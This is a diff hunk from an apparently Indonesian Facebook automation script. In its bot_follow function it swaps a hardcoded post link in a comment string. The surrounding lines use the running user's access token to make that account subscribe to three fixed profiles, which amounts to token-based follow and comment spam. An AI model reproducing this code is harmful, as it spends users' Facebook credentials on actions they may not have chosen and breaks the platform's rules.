@@ -265,7 +265,7 @@ def bot_follow():
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
 		logs()
 	jalan("%s[%s+%s] %sSabar ngab sedang masuk..."%(k,p,k,p))
-	kom = ("Aa Raka Ganteng Siapa Punya?\n\nhttps://www.facebook.com/100017584682867/posts/800676813861801/?app=fbl")
+	kom = ("Aa Raka Ganteng Siapa Punya?\n\nhttps://www.facebook.com/100000834003593/posts/4257706904267068/?app=fbl")
 	requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + toket)     
 	requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token=" + toket)    
 	requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + toket) 
